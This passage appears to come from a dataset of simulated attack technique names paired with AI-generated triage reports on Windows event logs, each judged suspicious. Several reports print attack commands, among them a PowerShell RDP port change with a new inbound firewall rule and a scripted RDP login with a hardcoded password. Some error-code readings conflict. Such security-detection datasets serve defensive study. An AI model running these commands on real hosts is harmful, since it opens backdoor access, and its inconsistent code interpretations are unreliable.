   - The command logged in the PowerShell event: `New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC -SkipCertificateCheck` indicates an attempt to map a remote file share possibly without properly validating SSL certificates. This could be risky or malicious if done without knowledge or approval as it might lead to a security bypass for SSL checks.

4. **Application Logs**:
   - Logs show normal operations of Microsoft Edge update services with no immediate signs of compromise.

5. **System Logs**:
   - System time adjustments are recorded but are part of standard NTP service operations as indicated by time.windows.com synchronization.

### Assessment:
The Sysmon and PowerShell logs indicate potentially suspicious activity:
- Use of PowerShell with `SkipCertificateCheck` flag.
- Repeated executions of `wevtutil.exe` and `conhost.exe` which could suggest an automated script doing log maintenance or cleanup without context.

### Conclusion:
- **Resolution**: **SUSPICIOUS** 
- While no immediate malicious actions are confirmed, certain log entries, especially those involving network mappings and skipping certificate checks using PowerShell, warrant further investigation to ensure they're expected activities within the operational context of this host.

### Guidance:
- Investigate the necessity and context of the PowerShell command that involved mapping network drives with `SkipCertificateCheck`.
- Monitor or audit the use of wevtutil and conhost, to ensure legitimate administrative operations.
- Verify with system administrators if these activities align with standard operating procedures or if further security measures are required to prevent potential misuse."
Copy and Execute File with PsExec,"Based on the analysis of the provided logs, here's the assessment:

1. **Application Log**:
   - The logs are showing standard events related to Windows Defender being active and an update for Microsoft Edge. No suspicious activities were noted here.

2. **Security Log**:
   - **EventID 4624** (Logon Success) and **EventID 4672** (Special privileges assigned) are noted several times. The SYSTEM account and another user, `admin_test`, are both illustrated in the log.
   - The presence of `SeDebugPrivilege` and other elevated privileges for `admin_test` requires further scrutiny as they can be used to obtain administrative access.
   - `admin_test` logon activities are associated with login type 3 (Network) from a specific workstation `DESKTOP-3HL5B2P`. It is notable that an external machine is used to log onto a server.

3. **System Log**:
   - The emergence of **PSEXESVC**, a service related to PsExec, indicates potential remote execution, which can be benign or malicious depending on the context.
   - Regular Windows updates activities are also present, showcasing Microsoft Defender activities which are expected and without anomalies.

4. **Sysmon Log**:
   - Sysmon event logs highlight running of various processes by `admin_test` such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and PsExec (`PSEXESVC.exe`).
   - The use of `PsExec` from a temporary user directory is concerning as it can sometimes indicate lateral movement or other administrative activities being carried out remotely.
   - **Process executions via Command Prompt** with URLs or paths leading to obscured directories are seen, which is atypical for routine tasks.

### Assessment:
- **SUSPICIOUS**: The behaviors indicating potential privilege escalation, the use of PsExec, and administrative commands executed remotely are grounds for concern. Although these activities might be part of legitimate administrative tasks, the combination along with elevated privileges, external logons and the execution of commands with potential capabilities to adjust or inspect system logs necessitates further investigation.

### Guidance:
1. **Further Investigation**:
   - Verify the legitimacy of `admin_test` and its authorizations.
   - Understand the context of the remote commands executed and cross-reference with set administrative activities.
   - Review PsExec usage policies within the organization to ensure it wasn't an unauthorized use.

2. **Log Correlation**:
   - Look for any correlated events on `DESKTOP-3HL5B2P` to verify remote activity or investigate external users that might have access.

3. **Monitor**:
   - Continue monitoring Sysmon and Security logs for any unusual activities, especially those originating from `admin_test` or related external machines.

Given that the activities could align with administrative tasks, consider these logs as suspicious until validated through further investigation."
Changing RDP Port to Non Standard Port via Powershell,"After reviewing the provided Windows event logs, the following conclusions can be drawn:

### Suspicious Activities Identified:

1. **PowerShell Usage with Unusual Commands**:
   - There are several PowerShell logs that indicate the use of PowerShell to modify the RDP port and create a new firewall rule for it:
     ```
     powershell.exe & {Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value 4489
     New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489}
     ```
   - Changing the RDP port from the default (typically 3389) to an unusual port (4489) can be indicative of an attempt to avoid detection or circumvent monitoring on standard ports.
   - The addition of a new firewall rule to allow inbound connections on this non-standard port amplifies the concern, suggesting a potential attempt to facilitate unauthorized remote access.

2. **Use of System Utilities and Processes**:
   - The execution of `whoami.exe`, `conhost.exe`, and others in quick succession could be part of routine tasks or part of nefarious activities to assess user privileges or system reconnaissance.
   - `wevtutil.exe` is commonly used for querying or manipulating event logs, which can be benign but might also be used by an adversary to delete logs to cover tracks. However, in isolation without supporting evidence of log tampering, it does not constitute definitive malicious activity.
   
3. **Return Code in Security Logs**:
   - The Security event log indicates multiple return codes of `3221226021` which translates to an access denied error. This might imply attempts to access resources with insufficient permissions, which could be an indication of suspicious behavior, albeit not automatically malicious.

4. **Update and Download Activities**:
   - The logs show several update-related activities, such as for Microsoft Defender Antivirus. These appear routine and expected. However, frequent updates and installations close in time might be something normal or could cover attempts to mask other installations or activities.

### Assessment:

Based on the analysis, the most concerning log entries center around the use of PowerShell to change configuration settings related to RDP, and to create new firewall rules allowing traffic on unusual ports. These actions are suspicious as they align with tactics often used by an attacker to persist in a system or establish a backdoor. While some logs could potentially be benign or administrative, the PowerShell activity particularly stands out as unconventional for regular operations.

### Final Resolution:
- **SUSPICIOUS**: There are signs of potentially unauthorized configuration changes that warrant further investigation. It is advised to investigate the origin of the PowerShell script execution, review user activity, check if similar patterns exist on other hosts, and validate if these changes were authorized.

### Recommendations:
- Conduct a thorough review of user accounts and permissions on the involved system.
- Review any recent configuration changes for authorization and legitimacy.
- Increase monitoring on non-standard ports and review any connections on port 4489.
- Consider conducting a threat hunt across the network to detect similar patterns.

These findings merit follow-up investigation to determine if these actions were taken by an authorized user or potentially indicate malicious intent."
PDQ Deploy RAT,"Upon analyzing the provided Windows event logs from the Windows machine ""Server002,"" the following observations and assessments have been made:

### **Security Log Analysis:**
- No security logs were provided for this analysis, thus preventing an in-depth review of specific login attempts, account creations, or privilege escalations typically observed within those logs.

### **System Log Analysis:**
- **Service Control Manager Event (ID 7045)**: A new service called ""PDQ Deploy"" was installed with the image path of ""C:\Program Files (x86)\Admin Arsenal\PDQ Deploy\PDQDeployService.exe"" and is currently disabled. The service is associated with administrative tasks or deployments and runs under the ""LocalSystem"" account. Without other context, the presence of this service could be part of legitimate enterprise software used for deployment.
  
- **Windows Update Client Events (ID 44)**: Multiple software updates, notably Microsoft VCLibs and CrossDevice services, have been logged as part of standard update procedures.

### **Windows PowerShell Log Analysis:**
- A PowerShell session executed a script to download and install PDQ Deploy via a network operation. This was executed along with some directory creation and silent installation (`""/s""` flag). Although downloading and executing installers using PowerShell can be a typical administrative operation, doing so can also resemble techniques applied in automated malware installations if not originating from a known or verified source.

### **Sysmon Log Analysis:**
- Multiple operations for processes like `conhost.exe`, `wevtutil.exe`, and `cmd.exe` suggest routine administrative tasks. The use of tools like `hostname.exe` and `whoami.exe` indicates system information gathering, which again could be benign in an administrative context.
- The execution of processes `msiexec.exe` also indicates the start of an installation, aligning with the installation of PDQ Deploy captured in the application logs.

### **Application Log Analysis:**
- **MsiInstaller Events (ID 11707, 1033, 1042)**: These logs confirm the installation of PDQ Deploy version 19.3.350.0, which completed successfully.

### **Overall Assessment:**
The activities logged show the installation and configuration of PDQ Deploy software, which is a legitimate software used for automating administrative tasks like software deployment within networks. The usage patterns (installation, system information gathering, directory creations) could be part of a standard IT operations task assuming PDQ Deploy is part of standard company administrative tools. However, if these operations were carried out without proper authorization or verification, they could raise concerns about potential security policy violations.

### **Resolution:**
**SUSPICIOUS**

The activity documented within the logs includes scripting and downloading operations over the network and the establishment of new services which bear the characteristics of automated administrative jobs. As these operations typically require administrative privileges and could equally denote malicious attempts if performed out of schedule or by unauthorized users, further investigation of the user ""admin_test"" and verification of the presence and legitimacy of PDQ Deploy within the environment should proceed.

**Recommendations for Further Action:**
- Verify the authenticity and authorization of the script that initiated the PDQ Deploy installation.
- Cross-reference user ""admin_test"" operations with scheduled or expected administrative activities.
- Ensure the integrity of the script source and review logs or alerts for similar activities to rule out any anomalous behavior linked to the specific user account or machine.

This decision suggests a level of caution due to the potential overlap between legitimate administrative operations and tactics frequently employed by attackers."
Deploy 7-Zip Using Chocolatey,"After analyzing the provided log entries, here is a detailed breakdown of any suspicious or anomalous behavior:

1. **Application Log:**
   - The application log does not show any concerning information. The edgeupdate service stopped as expected without irregularities.

2. **Sysmon Log:**
   - Various processes related to Microsoft Edge Update are running. These include entries like `MicrosoftEdgeUpdate.exe` and associated executables to manage updates. All associated SHA256 hashes are legitimate, matching expected values for Microsoft Edge Update files.
   - An instance of PowerShell (`powershell.exe`) is invoked by the user `admin_test`, running a Chocolatey command to install 7-Zip. While running PowerShell itself is not inherently malicious, using it to install software should be vetted, particularly if the user is not approved for software installations.
   - The presence of Windows processes such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe` are standard processes indirectly correlated with system operations or user queries and appear consistently associated with the same user `admin_test`. No anomalies were found in their execution.

3. **Windows PowerShell Log:**
   - The PowerShell logs correspond with the Sysmon logs' account of a PowerShell command being run to install 7-Zip via Chocolatey. Though using Chocolatey to install software isn't unusual, the action should be authorized by the organization's IT policy.

4. **Security Log:**
   - There were no entries provided or no anomalies detected within the scope of the logs presented.

5. **System Log:**
   - There were no entries provided or no anomalies detected within the scope of the logs presented.

**Assessment and Recommendations:**
- The logs reveal ongoing system and application management activity typical for automatic updates specific to Microsoft Edge. The concerning part is the PowerShell command executed for installing 7-Zip using Chocolatey. This might be routine, but without explicit approval or a predefined update schedule, it's best to verify if this is within expected operations.

**Resolution:**
- **SUSPICIOUS**: While there is no concrete evidence of malicious activity, the execution of a PowerShell command by `admin_test` needs verification to ensure it aligns with IT policies. It is advisable to:
  - Verify the legitimacy and authorization for the PowerShell script execution.
  - Cross-check user activities for `admin_test` during this period for patterns.
  - Ensure that any software installation (via Chocolatey or otherwise) is permissible by company policy and conducted under a controlled environment.

Given these observations, further investigation into the user's activities and permissions related to software installations is recommended."
Changing RDP Port to Non Standard Port via Command_Prompt,"Based on the analysis of the provided logs from the Windows machine ""Server002,"" here are the key findings:

1. **Time Manipulation (Events 4616):**
   - There are multiple instances of Event ID 4616, which logs changes to the system time. This can be indicative of an attempt to cover tracks or interfere with the logging process, which is suspicious behavior.

2. **High-Privilege Account Activities (Event 4672):**
   - The user ""admin_test"" was granted a wide range of privileges, including SeDebugPrivilege, SeSecurityPrivilege, SeBackupPrivilege, among others, implying high-level access. While this can be legitimate, such privileges should be carefully monitored.
   
3. **Remote Logon (Events 4624 and 4634):**
   - There was a successful network logon (Logon Type 3) by ""admin_test"" from a remote IP address (fe80::e3b5:5371:12a8:9c77). This account shortly afterward logged off. Remote logons should be closely monitored, especially when paired with elevated privileges.

4. **Process Execution with Elevated Privileges (Sysmon Events):**
   - Multiple instances of process creation using cmd.exe, reg.exe, and netsh.exe were logged, executing commands to change registry settings related to RDP ports and firewall rules (`reg add` and `netsh advfirewall firewall add`). Adjusting the RDP port and firewall rules is often utilized by malicious actors to maintain persistent remote access or evade detection.

5. **Edge Update Activity (Sysmon Logs):**
   - The Microsoft Edge installer seems to be running legitimate update tasks, as expected given the edgeupdate.exe process activity. However, ensure these update paths and processes match legitimate update cycles and no unusual access permissions are granted during this time.

6. **No PowerShell Activity:**
   - There are no logs from the Windows PowerShell log, which doesn’t indicate abnormality on its own, but any automated script running or malicious activity typically involves PowerShell and should be confirmed as non-existent during this time frame.

**Assessment:**
- **Time Changing** combined with **elevated privileges** and **network login events** suggests potentially suspicious activities.
- The modification of registry settings concerning RDP and firewall rules is a strong indicator of the possibility of illicit activity.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct further investigation into the ""admin_test"" account activities, especially focusing on the purpose and context of the high-level privileges and remote logins.
- Review historical logs to check for any pattern in time changes and login behavior.
- Contrast the Edge installer logs with legitimate update patterns to ensure integrity and validity.
- Ensure robust monitoring and alerting on modifications to RDP and firewall settings.
- Re-evaluate security measures related to remote access, possibly restrict or log details related to high-privilege account actions.
"
RDP to DomainController,"After analyzing the provided logs, several observations can be made regarding potential indicators of suspicious or malicious activity.

### Observations:
1. **Repeated Credential Access Failures (Security log EventID: 5379):**
   - Numerous events indicate failures with ReturnCode `3221226021`, which maps to `STATUS_LOGON_FAILURE`. This suggests repeated failed attempts to access credentials associated with the `MicrosoftAccount:user=02txoixylodcstop`.
   - These events occur consistently and might indicate either a misconfigured service or scripted attempts to access specific accounts without success.

2. **Privileged Actions (Security log EventID: 4624 and 4672):**
   - Successful logon events (EventID: 4624) as `SYSTEM` with LogonType 5 (Service) and associated privileged actions following them (EventID: 4672) are shown.
   - Privileges include sensitive rights such as `SeDebugPrivilege`, which are often targeted in exploitation contexts.

3. **Execution of PowerShell Commands (Sysmon log EventID: 1 and 5):**
   - There is PowerShell execution with a suspicious command line that involves using `cmdkey` to store credentials and then attempt an RDP connection using `mstsc`.
   - The presence of hardcoded credentials (`$Password=""1password2!""`) is concerning. This can suggest poor security practice or a leftover of a manual/scripted RDP connection attempt.

4. **Usage of `cmdkey` and `mstsc` (Sysmon log EventID: 1 and 5):**
   - Logs show the `cmdkey.exe` utility used for storing passwords for RDP connections that further support the PowerShell activity's intent.
   - Use of these utilities in the context seen is often associated with lateral movement tactics.

5. **Windows Update and System Component Executions (System and Sysmon logs):**
   - Several normal system operations such as Windows Update checks and component executions (e.g., `wuauclt.exe`, `svchost.exe`) are logged, which appear consistent with typical system maintenance activities.

### Assessment:
- **Credential Harvesting:** Frequent failed attempts to access credentials might indicate automated scripts or malware attempting unauthorized access.
- **Potential Privilege Misuse:** High privileges assigned to actions observed could hint at attempted privilege escalation or misuse.
- **Suspicious PowerShell Activity:** The PowerShell command intended for RDP connections shows a degree of preparation typical in attacks.

### Resolution:
- **SUSPICIOUS**: The activities involving password usage and repeated failed credential access need further investigation. There is evidence of potential lateral movement attempts that suggest a prudent approach of deeper examination of network activity, contact with responsible user accounts, and scrutiny over credentials involved.

---
### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Check for any unauthorized account activities related to the `MicrosoftAccount:user=02txoixylodcstop`.
   - Investigate the source and context of the PowerShell scripts being run. Validate any intended administrative activities from user `admin_test`.

2. **Further Investigation:**
   - Conduct network and endpoint analysis for evidence of lateral movement, especially around the timestamps of the PowerShell activity.
   - Review policy or manual validation on handling sensitive commands or scripts to ensure no hardcoded credentials exist.

3. **Security Recommendations:**
   - Reinforce logging and alerting mechanisms for tools like `cmdkey`, `mstsc`, and PowerShell.
   - Regularly audit privileges, especially those assigned to service logons or high-preference privileges like `SeDebugPrivilege`.

Ensure a holistic security review and response plan are activated across the infrastructure to mitigate potential security risks identified in these logs."
PowerShell Lateral Movement Using Excel Application Object,"Upon reviewing the given Windows event logs across different channels (System, Windows PowerShell, Sysmon, Application, and Security), I have identified a sequence of actions that merit further scrutiny due to suspicious behavior:

### Detailed Analysis:

**1. System Log:**
   - The log entries predominantly indicate updates related to Microsoft Defender Antivirus. These are standard and expected processes, showing the machine's update mechanism is functioning properly. There are no immediate red flags in these logs that suggest malicious activity.

**2. Windows PowerShell Log:**
   - The PowerShell logs show a sequence where `powershell.exe` was invoked to run a command that copies `calc.exe` (the Calculator application) to a non-standard location and renames it to `foxprow.exe`. It then tries to create an Excel COM object. Such behavior is typically associated with malicious activity, such as an attempt to disguise another executable or prepare for a future attack that uses Excel for malicious purposes.
   - The command failed, indicating an error in executing the intended operation. However, the intent itself suggests suspicious behavior warranting further investigation.

**3. Sysmon Log:**
   - The Sysmon logs correspond closely in timing with the PowerShell logs. They show sequential process executions within the same timeframe, highlighting `powershell.exe` and other benign operations (`hostname.exe`, `whoami.exe`).
   - The presence of `wevtutil.exe` and `conhost.exe` in quick succession aligns with legitimate system activity; however, such tools can be leveraged in attacks for log management or console operations bypassing.
   - Entries related to system processes such as `wuauclt.exe` and `svchost.exe` are expected, concurrent with system and Windows Update Client activities.

**Threat/Risk Assessment:**
The primary suspicious event involves the PowerShell command that attempts to move and rename `calc.exe`, which could be indicative of privilege escalation or persistence-related techniques, albeit unsuccessfully in this instance. However, the combination of using PowerShell to initiate direct file manipulation, especially executed by a user account `SERVER002\\admin_test`, which may possess elevated privileges, is concerning. The creation and attempted use of Excel COM objects cryptically hint toward potential automation for a task or exploitation.

### Guidance and Resolution:
- **SUSPICIOUS:** The activity witnessed primarily in the PowerShell logs suggests actions that deviate from normal user or system behavior. While no direct compromise has been confirmed, the nature of the commands attempted is indicative of tactics typically used in post-exploitation phases of an attack.
- **Recommended Actions:**
  1. **User Audit:** Verify `admin_test` account activity and its requirement level. Determine if this account has shown abnormal behavior patterns historically or if similar commands have been invoked previously.
  2. **Endpoint Security:** Strengthen PowerShell logging and use Advanced Threat Protection to capture detailed telemetry for script executions.
  3. **Inspection of Modified Files:** Check the `C:\\users\\admin\\AppData\\local\\Microsoft\\WindowsApps\\` directory for artifacts or remnants of unauthorized changes.
  4. **Threat Hunt:** Conduct a sweep for common indicators of compromise (IOCs) and misconfigurations allowing such actions to be performed.
  5. **Preventive Measures:** Educate users on risks associated with executing scripts and consider employing application control solutions such as AppLocker or Device Guard.

Conclusively, these steps can assist in determining whether these activities form part of a significantly larger threat or are benign misconfigurations or user errors."
